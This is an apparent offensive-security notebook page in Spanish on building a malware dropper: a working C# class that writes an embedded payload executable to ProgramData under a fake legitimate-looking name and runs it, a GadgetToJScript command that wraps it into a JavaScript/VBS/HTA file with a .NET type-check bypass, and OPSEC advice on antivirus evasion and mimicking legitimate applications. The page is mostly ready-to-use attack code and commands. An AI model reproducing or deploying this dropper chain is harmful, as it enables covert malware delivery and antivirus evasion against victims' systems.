---
tags: [initial-access, dropper, csharp, gadgettojscript, av-evasion]
status: done
platform: windows
---

# Droppers — Entrega de Payload Embebido

> Un dropper es un programa que trae otro programa. Objetivo: evadir AV y complicar el análisis de la cadena de infección.

---

## JavaScript Dropper con GadgetToJScript

Usa [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript) para generar gadgets .NET serializados que se deserializan desde JS/VBS/VBA.

### 1. Crear proyecto C# (.NET Framework Class Library)

```csharp
using System;
using System.IO;
using System.Reflection;

namespace MyDropper
{
    public class Dropper
    {
        public Dropper()
        {
            // Obtener referencia al propio assembly
            var assembly = Assembly.GetExecutingAssembly();

            // Leer payload embebido
            using (var rs = assembly.GetManifestResourceStream("MyDropper.http_x64.exe"))
            {
                // Ruta a ProgramData (escribible por usuarios estándar)
                var path = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                var newPath = Path.Combine(path, "MyLegitApp");
                var newDir = Directory.CreateDirectory(newPath);
                var filePath = Path.Combine(newDir.FullName, "MyApp.exe");

                // Escribir payload en disco
                using (var fs = File.Create(filePath))
                {
                    rs.CopyTo(fs);
                    rs.Close();
                }

                // Ejecutar
                System.Diagnostics.Process.Start(filePath);
            }
        }
    }
}
```

> [!NOTE] Namespace prefix
> El nombre del recurso debe llevar el namespace como prefijo: `MyDropper.http_x64.exe`

### 2. Añadir payload como recurso embebido

En Solution Explorer → Add → Existing Item → payload.exe
En Properties del payload: **Build Action → Embedded Resource**

### 3. Rutas de escritura disponibles

| Ruta | Escribible por usuario estándar |
|------|--------------------------------|
| `C:\Program Files\` | ❌ No |
| `C:\Program Files (x86)\` | ❌ No |
| `C:\ProgramData\` | ✅ Sí |
| `C:\Windows\` | ❌ No |

### 4. Serializar con GadgetToJScript

```powershell
GadgetToJScript.exe -a C:\...\MyDropper.dll -w js -b -o C:\Payloads\dropper
# -w: tipo de script (js, vbs, vba, hta)
# -b: bypass de type check de .NET 4.8+
# -o: ruta de salida (sin extensión)
```

Resultado: `dropper.js` que deserializa el assembly y ejecuta el constructor de `Dropper`.

---

## OPSEC

- El dropper escribe en disco — AV puede escanear el archivo al crearse.
- Combinar con técnicas de evasión de Artifact Kit para el payload embebido.
- Considerar usar rutas y nombres de archivo que imiten aplicaciones legítimas.
